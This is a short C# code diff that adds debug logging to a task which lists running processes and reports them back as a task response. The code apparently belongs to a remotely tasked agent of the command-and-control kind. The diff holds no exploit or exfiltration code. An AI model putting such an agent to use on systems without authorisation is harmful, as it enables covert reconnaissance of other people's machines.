@@ -16,19 +16,23 @@ namespace Workflow
         }
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             try
             {
                 List<ServerProcessInfo> processes = new List<ServerProcessInfo>();
 
                 if (OperatingSystem.IsWindows())
                 {
+                    DebugLog.Log($"{Name} using Windows process enumeration [{job.task.id}]");
                     processes.AddRange(ProcessHelper.GetProcessesWithParent());
                 }
                 else
                 {
+                    DebugLog.Log($"{Name} using generic process enumeration [{job.task.id}]");
                     processes.AddRange(convertProcessToServerProcess(Process.GetProcesses()));
                 }
 
+                DebugLog.Log($"{Name} found {processes.Count} processes [{job.task.id}]");
                 messageManager.AddTaskResponse(new ProcessTaskResponse
                 {
                     task_id = job.task.id,
@@ -40,6 +44,7 @@ namespace Workflow
             }
             catch (Exception e)
             {
+                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                 messageManager.AddTaskResponse(new ProcessTaskResponse
                 {
                     task_id = job.task.id,
@@ -48,6 +53,7 @@ namespace Workflow
                     processes = new List<ServerProcessInfo>()
                 });
             }
+            DebugLog.Log($"{Name} completed [{job.task.id}]");
         }
         private IEnumerable<string> GetTargetsFromFile(byte[] b)
         {
